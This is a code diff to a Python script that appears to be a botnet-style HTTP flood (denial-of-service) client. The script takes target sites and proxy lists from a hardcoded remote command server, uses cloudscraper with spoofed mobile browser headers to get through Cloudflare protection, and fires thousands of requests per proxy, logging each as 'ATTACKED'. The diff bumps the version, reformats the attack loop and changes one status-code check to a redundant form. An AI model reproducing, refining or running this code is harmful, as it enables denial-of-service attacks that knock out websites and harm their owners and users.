@@ -19,7 +19,7 @@ from urllib.request import urlopen
 import json
 import sys
 
-VERSION = 3
+VERSION = 4
 HOSTS = ["http://46.4.63.238/api.php"]
 MAX_REQUESTS = 5000
 disable_warnings()
@@ -57,6 +57,10 @@ def checkUpdate():
 		checkUpdate()
 
 def mainth():
+	scraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'android','mobile': True},)
+	scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
+			
+
 	while True:
 		scraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'android','mobile': True},)
 		scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
@@ -72,19 +76,19 @@ def mainth():
 		if site.startswith('http') == False:
 		    site = "https://" + site
 		try:
-		    attack = scraper.get(site)
-		    if attack.status_code >= 200:
-		        for proxy in data['proxy']:
-		            scraper.proxies.update({'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
-		            response = scraper.get(site)
-		            if response.status_code >= 200 and response.status_code <= 302:
-		                for i in range(MAX_REQUESTS):
-		                    response = scraper.get(site)
-		                    logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
-		    else:
-		        for i in range(MAX_REQUESTS):
-		            response = scraper.get(site)
-		            logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
+			attack = scraper.get(site)
+			if attack.status_code >= 302 and attack.status_code >= 200:
+				for proxy in data['proxy']:
+					scraper.proxies.update({'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
+					response = scraper.get(site)
+					if response.status_code >= 200 and response.status_code <= 302:
+						for i in range(MAX_REQUESTS):
+							response = scraper.get(site)
+							logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
+			else:
+				for i in range(MAX_REQUESTS):
+					response = scraper.get(site)
+					logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
 		except:
 		    logger.warning("issue happened")
 		    continue
